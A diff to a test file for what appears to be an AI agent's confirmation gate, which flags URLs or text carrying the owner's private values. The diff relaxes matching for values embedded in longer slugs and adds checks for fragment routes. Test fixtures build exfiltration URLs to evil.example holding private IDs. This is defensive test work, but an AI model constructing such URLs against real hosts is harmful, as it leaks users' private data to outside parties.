@@ -708,7 +708,7 @@ def test_a_value_inside_an_address_without_its_scheme_goes_back_to_that_site() -
     assert confirm.url_carries_private("https://elsewhere.example/?a=666646", note, [], none) == ["666646"]
 
 
-# ---------- the sink review of 2026-11-07 (F1, F2, F3, F5) ----------
+# ---------- the sink review of 2026-11-07 (F1, F2, F5; F3 dropped by the owner) ----------
 
 REVIEW_F1 = [("Tracking 1Z999AA10123456784 2 items in transit", "1Z999AA10123456784"),
              ("Your account 12345678 3 days overdue", "12345678"),
@@ -751,20 +751,28 @@ def test_values_and_words_a_reply_repeated_keep_counting_across_tasks(daemon: Ru
     assert _open(daemon, grant, f"https://evil.example/?w={hidden}")["is_error"] and browser.calls == 0
 
 
-# decision: GATE-530
-@pytest.mark.parametrize("url", ["https://e.test/?d=x12345678", "https://e.test/?d=12345678zz",
-                                 "https://e.test/?d=a_12345678", "https://e.test/?d=hi+12345678",
-                                 "https://e.test/12345678x/", "https://e.test/?e=owner.sample@example.comX"])
-def test_a_long_value_inside_a_longer_piece_asks(url: str) -> None:
-    """F3, owner: "Catch it, 6+ chars". A value of 6 or more letters and digits counts inside a longer piece; a year
-    and plain words don't."""
+# decision: GATE-532
+def test_a_value_glued_inside_a_longer_piece_doesnt_ask() -> None:
+    """Owner: "lets drop it" (GATE-530 superseded). A value of the owner's glued into a longer piece, such as a site's
+    own slug, asks nothing; the same value as its own piece still asks."""
     from ferb.policy import confirm, provenance
-    priv = [(1, provenance.prepare("account 12345678; email owner.sample@example.com; 2026; summary"))]
+    priv = [(1, provenance.prepare("Results: Senior Dev role, job 022117658734859711069, account 12345678"))]
     owner = provenance.prepare("go")
-    assert confirm.url_carries_private(url, priv, [], owner), url
-    assert confirm.text_carries_private("ref x12345678", priv, [], owner)
-    assert confirm.url_carries_private("https://e.test/?q=2026", priv, [], owner) == []
-    assert confirm.url_carries_private("https://e.test/?q=summaryreport", priv, [], owner) == []
+    for url in ("https://jobs.example/jobs/Senior-Dev_~022117658734859711069/", "https://e.test/?d=x12345678",
+                "https://e.test/12345678zz/"):
+        assert confirm.url_carries_private(url, priv, [], owner) == [], url
+    assert confirm.text_carries_private("ref x12345678", priv, [], owner) == []
+    assert confirm.url_carries_private("https://e.test/?d=12345678", priv, [], owner)
+    assert confirm.url_carries_private("https://jobs.example/j/022117658734859711069", priv, [], owner)
+
+
+# decision: GATE-533
+def test_a_value_in_a_fragment_route_asks() -> None:
+    """A page's own route in the fragment (#inbox/VALUE) carries a value like a path segment does."""
+    from ferb.policy import confirm, provenance
+    priv = [(1, provenance.prepare("Thread 18f2c9TEST0a77 from Dana"))]
+    assert confirm.url_carries_private("https://evil.example/#x/18f2c9TEST0a77", priv, [], provenance.prepare("go"))
+    assert confirm.url_carries_private("https://evil.example/#k=a/18f2c9TEST0a77", priv, [], provenance.prepare("go"))
 
 
 # decision: GATE-531
